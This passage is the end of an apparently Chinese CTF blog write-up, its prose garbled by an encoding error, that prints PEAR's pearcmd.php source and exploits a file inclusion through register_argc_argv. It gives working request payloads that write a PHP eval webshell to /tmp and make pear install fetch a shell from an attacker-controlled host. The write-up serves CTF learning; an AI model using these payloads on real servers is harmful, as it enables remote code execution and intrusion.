class="hljs-string">&#x27;version&#x27;</span>);<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;c&#x27;</span>:<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;C&#x27;</span>:<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-comment">// all non pear params goes to the command</span><br>        <span class="hljs-variable">$cmdopts</span>[<span class="hljs-variable">$opt</span>[<span class="hljs-number">0</span>]] = <span class="hljs-variable">$param</span>;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$store_system_config</span>) &#123;<br>    <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">store</span>(<span class="hljs-string">&#x27;system&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$store_user_config</span>) &#123;<br>    <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">store</span>(<span class="hljs-string">&#x27;user&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$command</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$options</span>[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>])) ? <span class="hljs-variable">$options</span>[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] : <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$command</span>) &amp;&amp; (<span class="hljs-variable">$store_user_config</span> || <span class="hljs-variable">$store_system_config</span>)) &#123;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$fetype</span> == <span class="hljs-string">&#x27;Gtk2&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">validConfiguration</span>()) &#123;<br>        PEAR::<span class="hljs-title function_ invoke__">raiseError</span>(<br>            <span class="hljs-string">&quot;CRITICAL ERROR: no existing valid configuration files found in &quot;</span> .<br>            <span class="hljs-string">&quot;files &#x27;<span class="hljs-subst">$pear_user_config</span>&#x27; or &#x27;<span class="hljs-subst">$pear_system_config</span>&#x27;, &quot;</span> .<br>            <span class="hljs-string">&quot;please copy an existing configuration file to one of these &quot;</span> .<br>            <span class="hljs-string">&quot;locations, or use the -c and -s options to create one&quot;</span><br>        );<br>    &#125;<br>    <span class="hljs-title class_">Gtk</span>::<span class="hljs-title function_ invoke__">main</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$command</span> == <span class="hljs-string">&#x27;help&#x27;</span>) &#123;<br>            <span class="hljs-title function_ invoke__">usage</span>(<span class="hljs-literal">null</span>, <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$options</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]) ? <span class="hljs-variable">$options</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] : <span class="hljs-literal">null</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">validConfiguration</span>()) &#123;<br>            PEAR::<span class="hljs-title function_ invoke__">raiseError</span>(<br>                <span class="hljs-string">&quot;CRITICAL ERROR: no existing valid configuration files found &quot;</span> .<br>                <span class="hljs-string">&quot;in files &#x27;<span class="hljs-subst">$pear_user_config</span>&#x27; or &#x27;<span class="hljs-subst">$pear_system_config</span>&#x27;, &quot;</span> .<br>                <span class="hljs-string">&quot;please copy an existing configuration file to one of &quot;</span> .<br>                <span class="hljs-string">&quot;these locations, or use the -c and -s options to create one&quot;</span><br>            );<br>        &#125;<br><br>        PEAR::<span class="hljs-title function_ invoke__">pushErrorHandling</span>(PEAR_ERROR_RETURN);<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">factory</span>(<span class="hljs-variable">$command</span>, <span class="hljs-variable">$config</span>);<br>        PEAR::<span class="hljs-title function_ invoke__">popErrorHandling</span>();<br>        <span class="hljs-keyword">if</span> (PEAR::<span class="hljs-title function_ invoke__">isError</span>(<span class="hljs-variable">$cmd</span>)) &#123;<br>            <span class="hljs-title function_ invoke__">usage</span>(<span class="hljs-literal">null</span>, <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$options</span>[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]) ? <span class="hljs-variable">$options</span>[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] : <span class="hljs-literal">null</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$short_args</span> = <span class="hljs-variable">$long_args</span> = <span class="hljs-literal">null</span>;<br>        <span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">getGetoptArgs</span>(<span class="hljs-variable">$command</span>, <span class="hljs-variable">$short_args</span>, <span class="hljs-variable">$long_args</span>);<br>        <span class="hljs-title function_ invoke__">array_shift</span>(<span class="hljs-variable">$options</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$tmp</span> = <span class="hljs-title class_">Console_Getopt</span>::<span class="hljs-title function_ invoke__">getopt2</span>(<span class="hljs-variable">$options</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$short_args</span>, <span class="hljs-variable">$long_args</span>);<br><br>        <span class="hljs-keyword">if</span> (PEAR::<span class="hljs-title function_ invoke__">isError</span>(<span class="hljs-variable">$tmp</span>)) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$tmpopt</span>, <span class="hljs-variable">$params</span>) = <span class="hljs-variable">$tmp</span>;<br>        <span class="hljs-variable">$opts</span> = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$tmpopt</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$foo</span> =&gt; <span class="hljs-variable">$tmp2</span>) &#123;<br>            <span class="hljs-keyword">list</span>(<span class="hljs-variable">$opt</span>, <span class="hljs-variable">$value</span>) = <span class="hljs-variable">$tmp2</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$value</span> === <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-variable">$value</span> = <span class="hljs-literal">true</span>; <span class="hljs-comment">// options without args</span><br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$opt</span>) == <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-variable">$cmdoptions</span> = <span class="hljs-variable">$cmd</span>-&gt;<span class="hljs-title function_ invoke__">getOptions</span>(<span class="hljs-variable">$command</span>);<br>                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$cmdoptions</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$o</span> =&gt; <span class="hljs-variable">$d</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$d</span>[<span class="hljs-string">&#x27;shortopt&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$d</span>[<span class="hljs-string">&#x27;shortopt&#x27;</span>] == <span class="hljs-variable">$opt</span>) &#123;<br>                        <span class="hljs-variable">$opts</span>[<span class="hljs-variable">$o</span>] = <span class="hljs-variable">$value</span>;<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$opt</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>) == <span class="hljs-string">&#x27;--&#x27;</span>) &#123;<br>                    <span class="hljs-variable">$opts</span>[<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$opt</span>, <span class="hljs-number">2</span>)] = <span class="hljs-variable">$value</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-variable">$ok</span> = <span class="hljs-variable">$cmd</span>-&gt;<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$command</span>, <span class="hljs-variable">$opts</span>, <span class="hljs-variable">$params</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ok</span> === <span class="hljs-literal">false</span>) &#123;<br>            PEAR::<span class="hljs-title function_ invoke__">raiseError</span>(<span class="hljs-string">&quot;unknown command `<span class="hljs-subst">$command</span>&#x27;&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (PEAR::<span class="hljs-title function_ invoke__">isError</span>(<span class="hljs-variable">$ok</span>)) &#123;<br>            PEAR::<span class="hljs-title function_ invoke__">setErrorHandling</span>(<br>                PEAR_ERROR_CALLBACK, <span class="hljs-keyword">array</span>(<span class="hljs-variable">$ui</span>, <span class="hljs-string">&quot;displayFatalError&quot;</span>)<br>            );<br>            PEAR::<span class="hljs-title function_ invoke__">raiseError</span>(<span class="hljs-variable">$ok</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (<span class="hljs-literal">false</span>);<br>&#125;<br><br><span class="hljs-comment">// &#123;&#123;&#123; usage()</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Display usage information</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> mixed $error       Optional error message</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> mixed $helpsubject Optional subject/command to display help for</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> void</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">usage</span>(<span class="hljs-params"><span class="hljs-variable">$error</span> = <span class="hljs-literal">null</span>, <span class="hljs-variable">$helpsubject</span> = <span class="hljs-literal">null</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$progname</span>, <span class="hljs-variable">$all_commands</span>;<br>    <span class="hljs-variable">$stdout</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;php://stdout&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (PEAR::<span class="hljs-title function_ invoke__">isError</span>(<span class="hljs-variable">$error</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-variable">$stdout</span>, <span class="hljs-variable">$error</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>() . <span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$error</span> !== <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-variable">$stdout</span>, <span class="hljs-string">&quot;<span class="hljs-subst">$error</span>\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$helpsubject</span> != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-variable">$put</span> = <span class="hljs-title function_ invoke__">cmdHelp</span>(<span class="hljs-variable">$helpsubject</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$put</span> = <span class="hljs-string">&quot;Commands:\n&quot;</span>;<br>        <span class="hljs-variable">$maxlen</span> = <span class="hljs-title function_ invoke__">max</span>(<span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">&quot;strlen&quot;</span>, <span class="hljs-variable">$all_commands</span>));<br>        <span class="hljs-variable">$formatstr</span> = <span class="hljs-string">&quot;%-<span class="hljs-subst">&#123;$maxlen&#125;</span>s  %s\n&quot;</span>;<br>        <span class="hljs-title function_ invoke__">ksort</span>(<span class="hljs-variable">$all_commands</span>);<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$all_commands</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$cmd</span> =&gt; <span class="hljs-variable">$class</span>) &#123;<br>            <span class="hljs-variable">$put</span> .= <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-variable">$formatstr</span>, <span class="hljs-variable">$cmd</span>, <span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">getDescription</span>(<span class="hljs-variable">$cmd</span>));<br>        &#125;<br>        <span class="hljs-variable">$put</span> .=<br>            <span class="hljs-string">&quot;Usage: <span class="hljs-subst">$progname</span> [options] command [command-options] &lt;parameters&gt;\n&quot;</span>.<br>            <span class="hljs-string">&quot;Type \&quot;<span class="hljs-subst">$progname</span> help options\&quot; to list all options.\n&quot;</span>.<br>            <span class="hljs-string">&quot;Type \&quot;<span class="hljs-subst">$progname</span> help shortcuts\&quot; to list all command shortcuts.\n&quot;</span>.<br>            <span class="hljs-string">&quot;Type \&quot;<span class="hljs-subst">$progname</span> help version\&quot; or &quot;</span>.<br>            <span class="hljs-string">&quot;\&quot;<span class="hljs-subst">$progname</span> version\&quot; to list version information.\n&quot;</span>.<br>            <span class="hljs-string">&quot;Type \&quot;<span class="hljs-subst">$progname</span> help &lt;command&gt;\&quot; to get the help &quot;</span>.<br>            <span class="hljs-string">&quot;for the specified command.&quot;</span>;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-variable">$stdout</span>, <span class="hljs-string">&quot;<span class="hljs-subst">$put</span>\n&quot;</span>);<br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$stdout</span>);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$error</span> === <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Return help string for specified command</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> string $command Command to return help for</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> void</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cmdHelp</span>(<span class="hljs-params"><span class="hljs-variable">$command</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$progname</span>, <span class="hljs-variable">$all_commands</span>, <span class="hljs-variable">$config</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$command</span> == <span class="hljs-string">&quot;options&quot;</span>) &#123;<br>        <span class="hljs-keyword">return</span><br>        <span class="hljs-string">&quot;Options:\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -v         increase verbosity level (default 1)\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -q         be quiet, decrease verbosity level\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -c file    find user configuration in `file&#x27;\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -C file    find system configuration in `file&#x27;\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -d foo=bar set user config variable `foo&#x27; to `bar&#x27;\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -D foo=bar set system config variable `foo&#x27; to `bar&#x27;\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -G         start in graphical (Gtk) mode\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -s         store user configuration\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -S         store system configuration\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -u foo     unset `foo&#x27; in the user configuration\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -h, -?     display help/usage (this message)\n&quot;</span>.<br>        <span class="hljs-string">&quot;     -V         version information\n&quot;</span>;<br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$command</span> == <span class="hljs-string">&quot;shortcuts&quot;</span>) &#123;<br>        <span class="hljs-variable">$sc</span> = <span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">getShortcuts</span>();<br>        <span class="hljs-variable">$ret</span> = <span class="hljs-string">&quot;Shortcuts:\n&quot;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$sc</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$s</span> =&gt; <span class="hljs-variable">$c</span>) &#123;<br>            <span class="hljs-variable">$ret</span> .= <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;     %-8s %s\n&quot;</span>, <span class="hljs-variable">$s</span>, <span class="hljs-variable">$c</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$ret</span>;<br><br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$command</span> == <span class="hljs-string">&quot;version&quot;</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;PEAR Version: &quot;</span>.<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;pear_package_version&#x27;</span>].<br>               <span class="hljs-string">&quot;\nPHP Version: &quot;</span>.<span class="hljs-title function_ invoke__">phpversion</span>().<br>               <span class="hljs-string">&quot;\nZend Engine Version: &quot;</span>.<span class="hljs-title function_ invoke__">zend_version</span>().<br>               <span class="hljs-string">&quot;\nRunning on: &quot;</span>.<span class="hljs-title function_ invoke__">php_uname</span>();<br><br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$help</span> = <span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">getHelp</span>(<span class="hljs-variable">$command</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$help</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;<span class="hljs-subst">$progname</span> <span class="hljs-subst">$command</span> [options] <span class="hljs-subst">$help</span>\n&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$help</span>[<span class="hljs-number">1</span>] === <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;<span class="hljs-subst">$progname</span> <span class="hljs-subst">$command</span> <span class="hljs-subst">$help</span>[0]&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;<span class="hljs-subst">$progname</span> <span class="hljs-subst">$command</span> [options] <span class="hljs-subst">$help</span>[0]\n<span class="hljs-subst">$help</span>[1]&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Command &#x27;<span class="hljs-subst">$command</span>&#x27; is not valid, try &#x27;<span class="hljs-subst">$progname</span> help&#x27;&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// &#125;&#125;&#125;</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * error_handler</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> mixed $errno  Error number</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> mixed $errmsg Message</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> mixed $file   Filename</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> mixed $line   Line number</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@access</span> public</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> boolean</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">error_handler</span>(<span class="hljs-params"><span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errmsg</span>, <span class="hljs-variable">$file</span>, <span class="hljs-variable">$line</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$errno</span> &amp; E_STRICT) &#123;<br>        <span class="hljs-keyword">return</span>; <span class="hljs-comment">// E_STRICT</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$errno</span> &amp; E_DEPRECATED) &#123;<br>        <span class="hljs-keyword">return</span>; <span class="hljs-comment">// E_DEPRECATED</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (!(<span class="hljs-title function_ invoke__">error_reporting</span>() &amp; <span class="hljs-variable">$errno</span>) &amp;&amp;<br>        <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;config&#x27;</span>]) &amp;&amp;<br>        <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;config&#x27;</span>]-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;verbose&#x27;</span>) &lt; <span class="hljs-number">4</span><br>    ) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// @silenced error, show all if debug is high enough</span><br>    &#125;<br>    <span class="hljs-variable">$errortype</span> = <span class="hljs-keyword">array</span> (<br>        E_DEPRECATED  =&gt; <span class="hljs-string">&#x27;Deprecated Warning&#x27;</span>,<br>        E_ERROR   =&gt;  <span class="hljs-string">&quot;Error&quot;</span>,<br>        E_WARNING   =&gt;  <span class="hljs-string">&quot;Warning&quot;</span>,<br>        E_PARSE   =&gt;  <span class="hljs-string">&quot;Parsing Error&quot;</span>,<br>        E_STRICT  =&gt; <span class="hljs-string">&#x27;Strict Warning&#x27;</span>,<br>        E_NOTICE   =&gt;  <span class="hljs-string">&quot;Notice&quot;</span>,<br>        E_CORE_ERROR  =&gt;  <span class="hljs-string">&quot;Core Error&quot;</span>,<br>        E_CORE_WARNING  =&gt;  <span class="hljs-string">&quot;Core Warning&quot;</span>,<br>        E_COMPILE_ERROR  =&gt;  <span class="hljs-string">&quot;Compile Error&quot;</span>,<br>        E_COMPILE_WARNING =&gt;  <span class="hljs-string">&quot;Compile Warning&quot;</span>,<br>        E_USER_ERROR =&gt;  <span class="hljs-string">&quot;User Error&quot;</span>,<br>        E_USER_WARNING =&gt;  <span class="hljs-string">&quot;User Warning&quot;</span>,<br>        E_USER_NOTICE =&gt;  <span class="hljs-string">&quot;User Notice&quot;</span><br>    );<br>    <span class="hljs-variable">$prefix</span> = <span class="hljs-variable">$errortype</span>[<span class="hljs-variable">$errno</span>];<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_PEAR_PHPDIR</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$_PEAR_PHPDIR</span>)) &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_PEAR_PHPDIR</span>) + <span class="hljs-number">1</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$file</span>);<br>    &#125;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;\n<span class="hljs-subst">$prefix</span>: <span class="hljs-subst">$errmsg</span> in <span class="hljs-subst">$file</span> on line <span class="hljs-subst">$line</span>\n&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Local variables:</span><br><span class="hljs-comment"> * tab-width: 4</span><br><span class="hljs-comment"> * c-basic-offset: 4</span><br><span class="hljs-comment"> * indent-tabs-mode: nil</span><br><span class="hljs-comment"> * mode: php</span><br><span class="hljs-comment"> * End:</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">// vim600:syn=php</span><br><br></code></pre></td></tr></table></figure></details><p>åˆ‡è¿‡å»çœ‹çœ‹ï¼Œå¯ä»¥çœ‹åˆ°<code>register_argc_argv</code>æ˜¯å¼€å¯çš„</p><p><img src="/posts/29460/image-20231026125928324.png" alt="image-20231026125928324"></p><p>è¿™æ—¶å€™å°±å¯ä»¥åˆ©ç”¨<code>$_SERVER[â€˜argvâ€™]</code>æ¥ä¼ é€’å‘½ä»¤ç»™<code>pearcmd</code></p><h3 id="config-create"><a href="#config-create" class="headerlink" title="config-create"></a>config-create</h3><p><code>?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_GET[0]);?&gt;+/tmp/shell.php</code></p><p>æµè§ˆå™¨è®¿é—®è¡Œä¸é€šï¼Œ<code>&lt;</code>ï¼Œ<code>&gt;</code>ä¼šè¢«<code>urlencode</code></p><p><img src="/posts/29460/image-20231026133801572.png" alt="image-20231026133801572"></p><p>æ‰€ä»¥ä½¿ç”¨Burpæ‹¦æˆªä¿®æ”¹æäº¤çš„å‚æ•°</p><p><img src="/posts/29460/image-20231026134010084.png" alt="image-20231026134010084"></p><p>æ¥ç€èšå‰‘è¿æ¥å°±è¡Œäº†ï¼ˆ<del>å…¶å®æœ‰æ—¶å€™ï¼Œæˆ‘æ›´å–œæ¬¢ç”¨<code>$_GET</code>ï¼Œæ‡’å¾—å¼€èšå‰‘</del></p><p><img src="/posts/29460/image-20231026134042781.png" alt="image-20231026134042781"></p><h3 id="installï¼ˆå‡ºç½‘"><a href="#installï¼ˆå‡ºç½‘" class="headerlink" title="installï¼ˆå‡ºç½‘"></a>installï¼ˆå‡ºç½‘</h3><p>åœ¨è‡ªå·±vpsä¸Šå¼€ä¸ªç«¯å£ï¼Œå†™ä¸ªshellï¼Œè¿™é‡Œç”¨çš„<code>$_GET</code></p><p><img src="/posts/29460/image-20231026134439674.png" alt="image-20231026134439674"></p><ul><li><p><code>?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://[host]:[port]/shell.php</code></p><p><img src="/posts/29460/image-20231026134628923.png" alt="image-20231026134628923"></p><p>å¯ä»¥çœ‹åˆ°shellè¢«ä¿å­˜åœ¨äº†<code>/var/www/html/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/tmp/pear/download/shell.php</code></p><p>ä½†æ˜¯è²Œä¼¼è¯»ä¸åˆ°ï¼ˆå‹æ ¹æ²¡å†™è¿›å»ï¼Ÿ</p><blockquote><p>å‚è€ƒä¸­è¿™æ ·è§£é‡Šçš„ï¼š</p><blockquote><p>&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;&#x2F;tmp&#x2F;pear&#x2F;download&#x2F;è·¯å¾„ä¸‹é¢ï¼Œè¿™é‡Œæˆ‘åœ¨ä½¿ç”¨çš„æ—¶å€™ä¼šé‡åˆ°ä¸€äº›æœ‰å…³é…ç½®æ–¹é¢çš„é—®é¢˜ï¼Œå› ä¸ºåä¸º&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;çš„æ–‡ä»¶å¤¹æ˜¯æ–°åˆ›å»ºçš„ï¼Œè€Œæˆ‘å¹¶æ²¡æœ‰æƒé™å¯¹å…¶è¿›è¡Œå†™æ“ä½œè€Œå¯¼è‡´åˆ©ç”¨å¤±è´¥ã€‚</p></blockquote></blockquote></li><li><p><code>?file=/usr/local/lib/php/pearcmd.php&amp;+install+-R+/tmp+http://[host]:[port]/shell.php</code></p><p><img src="/posts/29460/image-20231026135720181.png" alt="image-20231026135720181"></p><p>å¯ä»¥çœ‹åˆ°shellè¢«ä¿å­˜åˆ°äº†<code>/tmp/tmp/pear/download/shell.php</code></p><p>è¿™æ¬¡å°±å¯ä»¥è¯»äº†</p><p><img src="/posts/29460/image-20231026140047638.png" alt="image-20231026140047638"></p></li></ul><p><em><strong><center><font color="#81ecec" size="5">viking{shui_bu_zhao_naozibaozhale}</font></center></strong></em></p><h1 id="Bin"><a href="#Bin" class="headerlink" title="Bin"></a>Bin</h1>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF-Recruits</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
